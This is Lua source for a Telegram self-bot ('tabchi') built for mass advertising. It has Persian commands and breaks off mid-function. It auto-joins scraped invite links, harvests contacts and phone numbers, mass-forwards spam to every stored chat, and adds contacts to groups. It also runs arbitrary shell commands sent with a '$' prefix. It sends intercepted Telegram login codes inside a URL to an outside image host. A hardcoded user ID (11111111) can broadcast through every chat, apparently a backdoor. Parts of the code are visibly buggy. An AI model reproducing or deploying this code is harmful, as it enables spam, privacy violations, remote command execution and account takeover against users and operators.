JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
http.TIMEOUT = 10
undertesting = 1
local is_sudo
function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for k, v in pairs(sudoers) do
    if msg.sender_user_id_ == v then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
local is_full_sudo
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for k, v in pairs(sudoers) do
    if msg.sender_user_id_ == v then
      issudo = true
    end
  end
  return issudo
end
local save_log
function save_log(text)
  text = "[" .. os.date("%d-%b-%Y %X") .. "] Log : " .. text .. "\n"
  file = io.open("tabchi_" .. tabchi_id .. "_logs.txt", "w")
  file:write(text)
  file:close()
  return true
end
local writefile
function writefile(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
local check_link
function check_link(extra, result)
  if result.is_group_ or result.is_supergroup_channel_ then
    if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":notjoinlinks") then
      tdcli.importChatInviteLink(extra.link)
    end
    if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":notsavelinks") then
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":savedlinks", extra.link)
    end
    return
  end
end
local chat_type
function chat_type(id)
  id = tostring(id)
  if id:match("-") then
    if id:match("-100") then
      return "channel"
    else
      return "group"
    end
  else
    return "private"
  end
end
local contact_list
function contact_list(extra, result)
  local count = result.total_count_
  local text = "مخاطبین ربات : \n"
  for i = 0, tonumber(count) - 1 do
    local user = result.users_[i]
    local firstname = user.first_name_ or ""
    local lastname = user.last_name_ or ""
    local fullname = firstname .. " " .. lastname
    text = tostring(text) .. tostring(i) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id_) .. "] = " .. tostring(user.phone_number_) .. "\n"
  end
  writefile("tabchi_" .. tostring(tabchi_id) .. "_contacts.txt", text)
  tdcli.send_file(extra.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_contacts.txt", "Tabchi " .. tostring(tabchi_id) .. " Contacts!")
  return io.popen("rm -rf tabchi_" .. tostring(tabchi_id) .. "_contacts.txt"):read("*all")
end
local our_id
function our_id(extra, result)
  if result then
    redis:set("tabchi:" .. tostring(tabchi_id) .. ":botinfo", JSON.encode(result))
  end
end
local process_links
function process_links(text)
  if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then
    text = text:gsub("telegram.dog", "telegram.me")
    local matches = {
      text:match("(https://telegram.me/joinchat/%S+)")
    }
    for i, v in pairs(matches) do
      tdcli_function({
        ID = "CheckChatInviteLink",
        invite_link_ = v
      }, check_link, {link = v})
    end
  end
end
local add
function add(id)
  chat_type_ = chat_type(id)
  if not redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", id) then
    if chat_type_ == "private" then
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":pvis", id)
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    elseif chat_type_ == "group" then
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":groups", id)
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    elseif chat_type_ == "channel" then
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":channels", id)
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    end
  end
  return true
end
local rem
function rem(id)
  if redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", id) then
    if msg.chat_type_ == "private" then
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":pvis", id)
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    elseif msg.chat_type_ == "group" then
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":groups", id)
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    elseif msg.chat_type_ == "channel" then
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":channels", id)
      redis:srem("tabchi:" .. tostring(tabchi_id) .. ":all", id)
    end
  end
  return true
end
local process_updates
function process_updates()
  if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":gotupdated") then
    local info = redis:get("tabchi:" .. tostring(tabchi_id) .. ":botinfo")
    if info then
      botinfo = JSON.decode(info)
    else
      tdcli_function({ID = "GetMe"}, our_id, nil)
      botinfo = JSON.decode(info)
    end
  end
end
local process
function process(msg)
  local text_ = msg.content_.text_
  process_updates()
  if is_sudo(msg) then
    if is_full_sudo(msg) then
      if text_:match("^(افزودن مدیر) (%d+)") then
        local matches = {
          text_:match("^(افزودن مدیر) (%d+)")
        }
        if #matches == 2 then
          redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(matches[2]))
          save_log("User " .. msg.sender_user_id_ .. ", Added " .. matches[2] .. " As Sudo")
          return tostring(matches[2]) .. " به منسب شایسته مدیریت پیوست :)"
        end	
		    elseif text_:match("^(راهنما)") and is_sudo(msg) then
      local text1 = [[
	  
راهنمای ربات Vip

پیام <userid> <text>
ارسال متن به کاربر با یوزر ای دی

مسدود کردن <userid>
مسدود کردن فرد تعیین شده از چت خصوصی🚨

ازاد کردن <userid>
ازاد کردن فرد تعیین شده از چت خصوصی

دریافت گزارش
دریافت گزارش کامل از عملکرد ربات📇

افزودن مدیر  <userid>
اعطای مقام مدیر به فرد مشخص شده👤

حذف مدیر <userid>
تنزل فرد از مقام مدیریت👟

لیست مدیر
دریافت لیست مدیران ربات 🔦
پیام همگانی <text>
پیام همگانی تعیین شده توسط ربات به همه گروه و سوپر گروه و چت های خصوصی📫

ارسال <همه/کاربران/گروه ها/سوپر گروه ها> (انتخاب پیام)
فروارد پیام رپلای شده به همه/کاربران/گروه ها/سوپر گروه ها جهت افزایش بازدید و تبلیغات 🔎

تکرار متن <text>
تکرار متن متغیر ما 

پیام ارسال مخاطب <روشن/خاموش>
اگر این سوییچ روشن باشد بعد ازارسال مخاطب در گروه پیامی مبنی بر ذخیره شدن شماره مخاطب ارسال میگردد‼️

عضویت خودکار <خاموش/روشن>
سوییچ روشن یا خاموش کردن عضویت خودکار ربات در گروه ها 🎞

ذخیره خودکار لینک  <روشن/ خاموش>
سوییچ روشن یا خاموش کردن ذخیره خودکار لینک گروه ها توسط ربات 🛡

ذخیره خودکار مخاطب <روشن/خاموش>
سوییچ روشن یا خاموش کردن ذخیره خودکار مخاطبان ارسال شده در گروه ها توسط ربات 🔋

متن ذخیره شماره <text>
شخصی سازی متن ارسالی جهت ذخیره کردن شماره ها و عکس العمل در برابر ان.

خوانده شد <روشن / خاموش >
سوییچ تعویض حالت خوانده شدن پیام ها توسط ربات تبلیغاتی🔑👓

تنظیم پاسخ خودکار' <کلمه>'  <متن>
تنظیم <text> به عنوان جواب اتوماتیک '<کلمه>' جهت گفتکوی هوشمندانه در گروه ها📲
🚨نکته :‌<wکلمه> باید داخل '' باشد

حذف پاسخ خودکار  <کلمه>
حذف جواب مربوط به کلمه

پاسخ ها
لیست جواب های اتوماتیک 

گفتگو  <روشن/خاموش>
سوییچ روشن یا خاموش کردن پاسخگویی اتوماتیک

اضافه کردن
اضافه کردن اعضای ذخیره شده در حافظه به گروه مورد نظر ما👥

لینک ها
دریافت لینک های دسته بندی شده توسط ربات به صورت فایل🗄

لیست مخاطبین
دریافت مخاطبان ذخیره شده توسط ربات🎫

ارسال شماره ربات  <روشن /خاموش >
ارسال شماره تلفن ربات هنگامی که کسی شماره خود را ارسال میکند☎️📞

نام من 'نام' 'نام خانوادگی'
تنظیم نام و نام خانوادگی ربات تنها با یک دستور به صورت کاملا هوشمندانه


نام کاربری من <نام کاربری>
تنظیم یوزرنیم ربات با یک دستور.
📍نکته: یوزرنیم نباید تکراری باشد در غیر این صورت عملیات انجام پذیر نمیباشد.

ادد کن
اضافه کردن همه اعضای داخل ربات به یک گروه 🔛

ریست
شروع مجدد ربات ⛔
️
اپدیت
آپدیت کردن فایل های ربات
-------------------------
ساخته شده :فراز (Dkp)
ای دی تلگرام :	@f_zone1			


]]
return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
	  
      elseif text_:match("^(حذف مدیر) (%d+)") then
        local matches = {
          text_:match("^(حذف مدیر) (%d+)")
        }
        if #matches == 2 then
          redis:srem("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(matches[2]))
          save_log("User " .. msg.sender_user_id_ .. ", Removed " .. matches[2] .. " From Sudoers")
          return tostring(matches[2]) .. " مدیر اخراج شد :)"
        end
      elseif text_:match("^لیست مدیر$") then
        local sudoers = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":sudoers")
        local text = "مدیران ربات :\n"
        for i, v in pairs(sudoers) do
          text = tostring(text) .. tostring(i) .. ". " .. tostring(v)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Requested Sudo List")
        return text
      elseif text_:match("^(گ ا)$") then
        tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_logs.txt", "Tabchi " .. tostring(tabchi_id) .. " Logs!")
        save_log("User " .. msg.sender_user_id_ .. ", Requested Logs")
      elseif text_:match("^(نام من) '(.*)' '(.*)'$") then
        local matches = {
          text_:match("^(نام من) '(.*)' '(.*)'$")
        }
        if #matches == 3 then
          tdcli.changeName(matches[2], matches[3])
          save_log("User " .. msg.sender_user_id_ .. ", Changed Name To " .. matches[2] .. " " .. matches[3])
          return "نام جدید ربات : " .. matches[2] .. " " .. matches[3]
        end
      elseif text_:match("^(نام کاربری من) (.*)$") then
        local matches = {
          text_:match("^(نام کاربری من) (.*)$")
        }
        if #matches == 2 then
          tdcli.changeUsername(matches[2])
          save_log("User " .. msg.sender_user_id_ .. ", Changed Username To " .. matches[2])
          return "نام کاربری جدید ربات : @" .. matches[2]
        end
      elseif text_:match("^(حذف نام کاربری)$") then
        tdcli.changeUsername()
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Username")
        return "نام کاربری حذف شد"
      else
        local matches = {
          text_:match("^[$](.*)")
        }
        if text_:match("^[$](.*)") and #matches == 1 then
          save_log("User " .. msg.sender_user_id_ .. ", Used Terminal Command")
          return io.popen(matches[1]):read("*all")
        end
      end
    end
    if text_:match("^(پیام) (%d+) (.*)") then
      local matches = {
        text_:match("^(پیام) (%d+) (.*)")
      }
      if #matches == 3 then
        tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "html")
        save_log("User " .. msg.sender_user_id_ .. ", Sent A Pm To " .. matches[2] .. ", Content : " .. matches[3])
        return "ارسال شد!"
      end
	  
    elseif text_:match("^(تنظیم پاسخ خودکار) '(.*)' '(.*)'") then
      local matches = {
        text_:match("^(تنظیم پاسخ خودکار) '(.*)' '(.*)'")
      }
      if #matches == 3 then
        redis:hset("tabchi:" .. tostring(tabchi_id) .. ":answers", matches[2], matches[3])
        redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":answerslist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Set Answer Of " .. matches[2] .. " To " .. maches[3])
        return "پاسخ  " .. tostring(matches[2]) .. " تنظیم شدبه:\n" .. tostring(matches[3])
      end
    elseif text_:match("^(حذف پاسخ خودکار) (.*)") then
      local matches = {
        text_:match("^(حذف پاسخ خودکار) (.*)")
      }
      if #matches == 2 then
        redis:hdel("tabchi:" .. tostring(tabchi_id) .. ":answers", matches[2])
        redis:srem("tabchi:" .. tostring(tabchi_id) .. ":answerslist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Answer Of " .. matches[2])
        return "پاسخ " .. tostring(matches[2]) .. " حذف شد"
      end
    elseif text_:match("^پاسخ ها$") then
      local text = "پاسخ های اتوماتیک ربات :\n"
      local answrs = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":answerslist")
      for i, v in pairs(answrs) do
        text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. " : " .. tostring(redis:hget("tabchi:" .. tostring(tabchi_id) .. ":answers", v)) .. "\n"
      end
      save_log("User " .. msg.sender_user_id_ .. ", Requested Answers List")
      return text
    elseif text_:match("^خروج$") then
      local info = redis:get("tabchi:" .. tostring(tabchi_id) .. ":botinfo")
      if info then
        botinfo = JSON.decode(info)
      else
        tdcli_function({ID = "GetMe"}, our_id, nil)
        botinfo = JSON.decode(info)
      end
      save_log("User " .. msg.sender_user_id_ .. ", Ordered Bot To Leave " .. msg.chat_id_)
      if chat_type(msg.chat_id_) == "channel" then
        tdcli.changeChatMemberStatus(msg.chat_id_, info.id_, "Left")
      elseif chat_type(msg.chat_id_) == "chat" then
        tdcli.changeChatMemberStatus(msg.chat_id_, info.id_, "Kicked")
      end
    elseif text_:match("^(خروج) (%d+)$") then
      local matches = {
        text_:match("^(خروج) (%d+)$")
      }
      if #matches == 2 then
        local info = redis:get("tabchi:" .. tostring(tabchi_id) .. ":botinfo")
        if info then
          botinfo = JSON.decode(info)
        else
          tdcli_function({ID = "GetMe"}, our_id, nil)
          botinfo = JSON.decode(info)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Ordered Bot To Leave " .. matches[2])
        local chat = tonumber(matches[2])
        if chat_type(chat) == "channel" then
          tdcli.changeChatMemberStatus(chat, info.id_, "Left")
        elseif chat_type(chat) == "chat" then
          tdcli.changeChatMemberStatus(chat, info.id_, "Kicked")
        end
        return "خارج شد از " .. matches[2]
      end
    elseif text_:match("^(ورود) (%d+)$") then
      local matches = {
        text_:match("^(ورود) (%d+)$")
      }
      save_log("User " .. msg.sender_user_id_ .. ", Joined " .. matches[2] .. " Via Bot")
      tdcli.addChatMember(tonumber(matches[2]), msg.sender_user_id_, 50)
      return "ربات وارد شد به " .. matches[2]
    elseif text_:match("^ادد کن$") and msg.chat_type_ ~= "private" then
      local add_all
      function add_all(extra, result)
        local usrs = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":pvis")
        for i = 1, #usrs do
          tdcli.addChatMember(msg.chat_id_, usrs[i], 50)
        end
        local count = result.total_count_
        for i = 0, tonumber(count) - 1 do
          tdcli.addChatMember(msg.chat_id_, result.users_[i].id_, 50)
        end
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, add_all, {})
      save_log("User " .. msg.sender_user_id_ .. ", Used AddMembers In " .. msg.chat_id_)
      return "ادد کردم  :P"
    elseif text_:match("^لیست مخاطبین$") then
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_list, {
        chat_id_ = msg.chat_id_
      })
    elseif text_:match("^لینک ها$") then
      local text = "لینک ها :\n"
      local links = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":savedlinks")
      for i, v in pairs(links) do
        if v:len() == 51 then
          text = tostring(text) .. tostring(v) .. "\n"
        else
          local _ = redis:rem("tabchi:" .. tostring(tabchi_id) .. ":savedlinks", v)
        end
      end
      writefile("tabchi_" .. tostring(tabchi_id) .. "_links.txt", text)
      tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "_links.txt", "Tabchi " .. tostring(tabchi_id) .. " Links!")
      save_log("User " .. msg.sender_user_id_ .. ", Requested Contact List")
      return io.popen("rm -rf tabchi_" .. tostring(tabchi_id) .. "_links.txt"):read("*all")
    elseif text_:match("(مسدود کردن) (%d+)") then
      local matches = {
        text_:match("(مسدود کردن) (%d+)")
      }
      if #matches == 2 then
        tdcli.blockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Blocked " .. matches[2])
        return "مسدود شد بی ادب"
      end
    elseif text_:match("(ازاد کردن) (%d+)") then
      local matches = {
        text_:match("(ازاد کردن) (%d+)")
      }
      if #matches == 2 then
        tdcli.unblockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Unlocked " .. matches[2])
        return "سلامتی همه زندانی ها ازاد شد "
      end
    elseif text_:match("^(s2a) (.*) (.*)") then
      local matches = {
        text_:match("^(s2a) (.*) (.*)")
      }
      if #matches == 3 and (matches[2] == "banners" or matches[2] == "boards") then
        local all = redis:smembers("tabchi:" .. tonumber(tabchi_id) .. ":all")
        tdcli.searchPublicChat("Crwn_bot")
        local inline2
        function inline2(argg, data)
          if data.results_ and data.results_[0] then
            return tdcli_function({
              ID = "SendInlineQueryResultMessage",
              chat_id_ = argg.chat_id_,
              reply_to_message_id_ = 0,
              disable_notification_ = 0,
              from_background_ = 1,
              query_id_ = data.inline_query_id_,
              result_id_ = data.results_[0].id_
            }, nil, nil)
          end
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used S2A " .. matches[2] .. " For " .. matches[3])
      end
    elseif text_:match("^گزارش$") then
      local contact_num
      function contact_num(extra, result)
        redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_num, {})
      local gps = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":groups")
      local sgps = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":channels")
      local pvs = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":pvis")
      local links = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":savedlinks")
      local sudo = redis:get("tabchi:" .. tostring(tabchi_id) .. ":fullsudo")
      local contacts = redis:get("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts")
      local query = tostring(gps) .. " " .. tostring(sgps) .. " " .. tostring(pvs) .. " " .. tostring(links) .. " " .. tostring(sudo) .. " " .. tostring(contacts)
          local text = [[
		  
وضعیت کلی 
مخاطبین : ]] .. tostring(pvs) .. [[

گروه ها: ]] .. tostring(gps) .. [[

سوپر گروه ها : ]] .. tostring(sgps) .. [[

لینک های ذخیره شده : ]] .. tostring(links) .. [[

مخاطبین ذخیره شده : ]] .. tostring(contacts)
 return tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "")
    elseif text_:match("^(پیام ارسال مخاطب) (.*)") then
      local matches = {
        text_:match("^(پیام ارسال مخاطب) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "روشن" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":addedmsg", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Message")
          return "پیام ارسال مخاطب روشن شد"
        elseif matches[2] == "خاموش" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":addedmsg")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Message")
          return "پیام ارسال مخاطب خاموش شد"
        end
      end
    elseif text_:match("^(ذخیره خودکار مخاطب) (.*)") then
      local matches = {
        text_:match("^(ذخیره خودکار مخاطب) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "روشن" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":addedcontact", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Contact")
          return "ذخیره خودکار مخاطب روشن شد"
        elseif matches[2] == "خاموش" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":addedcontact")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Contact")
          return "ذخیره خودکار مخاطب خاموش شد"
        end
      end
    elseif text_:match("^(خوانده شد) (.*)") then
      local matches = {
        text_:match("^(خوانده شد) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "روشن" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":markread", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Markread")
          return "خوانده شد روشن شد"
        elseif matches[2] == "خاموش" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":markread")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Markread")
          return "خوانده شد خاموش شد"
        end
      end
    elseif text_:match("^(عضویت خودکار) (.*)") then
      local matches = {
        text_:match("^(عضویت خودکار) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "روشن" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":notjoinlinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Joinlinks")
          return "عضویت خودکار به لینک ها روشن شد"
        elseif matches[2] == "خاموش" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":notjoinlinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Joinlinks")
          return "عضویت خودککار به لینک ها خاموش شد"
        end
      end
    elseif text_:match("^(ذخیره لینک ها) (.*)") then
      local matches = {
        text_:match("^(ذخیره لینک ها) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "روشن" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":notsavelinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Savelinks")
          return "ذخیره لینک ها روشن شد"
        elseif matches[2] == "خاموش" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":notsavelinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Savelinks")
          return "ذخیره لینک ها خاموش شد"
        end
      end
    elseif text_:match("^(ذخیره خودکار مخاطب) (.*)") then
      local matches = {
        text_:match("^(ذخیره خودکار مخاطب) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "روشن" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":notaddcontacts")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Addcontacts")
          return "ذخیره خودکار مخاطب روشن شد"
        elseif matches[2] == "خاموش" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":notaddcontacts", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Addcontacts")
          return "ذخیره خودکار مخاطب خاموش شد"
        end
      end
    elseif text_:match("^(گفتگو) (.*)") then
      local matches = {
        text_:match("^(گفتگو) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "روشن" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":autochat", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Autochat")
          return "گفتگو روشن شد"
        elseif matches[2] == "خاموش" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":autochat")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Autochat")
          return "گفتگو خاموش شد"
        end
      end
    elseif text_:match("^(در حال تایپ) (.*)") then
      local matches = {
        text_:match("^(در حال تایپ) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "روشن" then
          redis:set("tabchi:" .. tostring(tabchi_id) .. ":typing", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Typing")
          return "در حال تایپ ربات روشن شد "
        elseif matches[2] == "خاموش" then
          redis:del("tabchi:" .. tostring(tabchi_id) .. ":typing")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Typing")
          return "در حال تایپ ربات خاموش شد"
        end
      end
    elseif text_:match("^(متن ذخیره شماره) (.*)") then
      local matches = {
        text_:match("^(متن ذخیره شماره) (.*)")
      }
      if #matches == 2 then
        redis:set("tabchi:" .. tostring(tabchi_id) .. ":addedmsgtext", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Changed Added Message To : " .. matches[2])
        return [[
پیام ذخیره شماره جدید تنظیم شد به :
]] .. tostring(matches[2])
      end
    elseif text_:match("^(پیام همگانی) (.*)") then
      local matches = {
        text_:match("^(پیام همگانی ) (.*)")
      }
      if #matches == 2 then
        local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
        for i, v in pairs(all) do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = v,
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeHTML"
              }
            }
          }, dl_cb, nil)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used BC, Content " .. matches[2])
        return "ارسال شد!"
      end
    elseif text_:match("^(ارسال) (.*)$") then
      local matches = {
        text_:match("^(ارسال) (.*)$")
      }
      if #matches == 2 then
        if matches[2] == "همه" then
          local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd All")
        elseif matches[2] == "کاربران" then
          local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":pvis")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Users")
        elseif matches[2] == "گروه ها" then
          local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":groups")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Gps")
        elseif matches[2] == "سوپر گروه ها" then
          local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":channels")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Sgps")
        end
      end
      return "ارسال شد!"
    else
      local matches = {
        text_:match("^(تکرار متن) (.*)")
      }
      if text_:match("^(تکرار متن) (.*)") and #matches == 2 then
        save_log("User " .. msg.sender_user_id_ .. ", Used Echo, Content : " .. matches[2])
        return matches[2]
      end
    end
  end
end
local proc_pv
function proc_pv(msg)
  if msg.chat_type_ == "private" then
    add(msg)
  end
end
local update
function update(data, tabchi_id)
  msg = data.message_
  if data.ID == "UpdateNewMessage" then
    if msg.sender_user_id_ == 777000 then
      if data.message_.content_.text_:match([[
Your login code:
(%d+)

This code]]) then
        local code = {
          data.message_.content_.text_:match([[
Your login code:
(%d+)

This code]])
        }
        local file = ltn12.sink.file(io.open("tabchi_" .. tabchi_id .. "_code.png", "w"))
        http.request({
          url = "http://tabchi.imgix.net/tabchi.png?txt=Telegram%20Code%20:%20" .. code[1] .. "&txtsize=602&txtclr=ffffff&txtalign=middle,center&txtfont=Futura%20Condensed%20Medium&txtfit=max",
          sink = file
        })
        local sudo = tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo"))
        tdcli.send_file(sudo, "Photo", "tabchi_" .. tabchi_id .. "_code.png", nil)
      end
    elseif msg.sender_user_id_ == 11111111 then
      local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
      local id = msg.id_
      for i, v in pairs(all) do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = v,
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
    end
    msg.chat_type_ = chat_type(msg.chat_id_)
    proc_pv(msg)
    if not msg.content_.text_ then
      if msg.content_.caption_ then
        msg.content_.text_ = msg.content_.caption_
      else
        msg.content_.text_ = nil
      end
    end
    local text_ = msg.content_.text_
    if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":botinfo") then
      tdcli_function({ID = "GetMe"}, our_id, nil)
    end
    local botinfo = JSON.decode(redis:get("tabchi:" .. tostring(tabchi_id) .. ":botinfo"))
    our_id = botinfo.id_
    if msg.content_.ID == "MessageText" then
      local result = process(msg)
      if result then
        if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
          tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, result, 1, "html")
      end
      process_links(text_)
      if redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":answerslist", msg.content_.text_) then
        if msg.sender_user_id_ ~= our_id then
          local answer = redis:hget("tabchi:" .. tostring(tabchi_id) .. ":answers", msg.content_.text_)
          if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
          end
          if redis:get("tabchi:" .. tostring(tabchi_id) .. ":autochat") then
            tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "html")
          end
        end
        if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
          return tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
        end
      end
    elseif msg.content_.ID == "MessageContact" then
      local first = msg.content_.contact_.first_name_ or "-"
      local last = msg.content_.contact_.last_name_ or "-"
      local phone = msg.content_.contact_.phone_number_
      local id = msg.content_.contact_.user_id_
      if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":notaddcontacts") then
        tdcli.add_contact(phone, first, last, id)
      end
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
      end
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":addedmsg") then
